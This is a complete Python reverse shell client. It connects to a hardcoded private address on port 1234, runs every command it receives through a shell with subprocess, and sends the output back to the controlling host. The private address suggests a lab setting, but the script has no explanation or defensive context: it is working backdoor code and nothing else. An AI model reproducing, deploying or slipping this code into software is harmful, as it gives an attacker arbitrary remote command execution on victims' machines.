import socket
import subprocess

RHOST = '192.168.13.128'
RPORT = 1234
client = socket.socket()
print("[-] Connection Initiating...")
client.connect((RHOST, RPORT))
print("[-] Connection initiated!")

while True:
    print("[-] Awaiting commands...")
    command = client.recv(1024)
    command = command.decode()
    op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
    output = op.stdout.read()
    output_error = op.stderr.read()
    print("[-] Sending response...")
    client.send(output + output_error)
